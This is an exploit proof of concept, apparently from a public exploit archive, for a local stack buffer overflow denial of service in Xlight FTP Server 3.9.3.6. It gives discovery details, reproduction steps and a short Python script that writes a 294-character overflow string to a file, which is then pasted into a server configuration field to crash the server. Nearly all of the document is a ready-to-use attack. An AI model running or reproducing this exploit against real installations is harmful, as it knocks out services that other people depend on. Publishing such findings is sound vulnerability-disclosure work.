# Exploit Title: Xlight FTP Server 3.9.3.6 - 'Stack Buffer Overflow' (DOS)
# Discovered by: Yehia Elghaly
# Discovered Date: 2023-08-04
# Vendor Homepage: https://www.xlightftpd.com/
# Software Link : https://www.xlightftpd.com/download/setup.exe
# Tested Version: 3.9.3.6
# Vulnerability Type: Buffer Overflow Local
# Tested on OS: Windows XP Professional SP3 - Windows 11 x64

# Description: Xlight FTP Server 3.9.3.6 'Execute Program' Buffer Overflow (PoC)

# Steps to reproduce:
# 1. - Download and Xlight FTP Server
# 2. - Run the python script and it will create exploit.txt file.
# 3. - Open Xlight FTP Server 3.9.3.6
# 4. - "File and Directory - Modify Virtual Server Configuration - Advanced - Misc- Setup
# 6. - Execute a Program after use logged in-  Paste the characters
# 7  - Crashed

#!/usr/bin/env python3

exploit = 'A' * 294

try:
    with open("exploit.txt","w") as file:
        file.write(exploit)
    print("POC is created")
except:
    print("POC not created")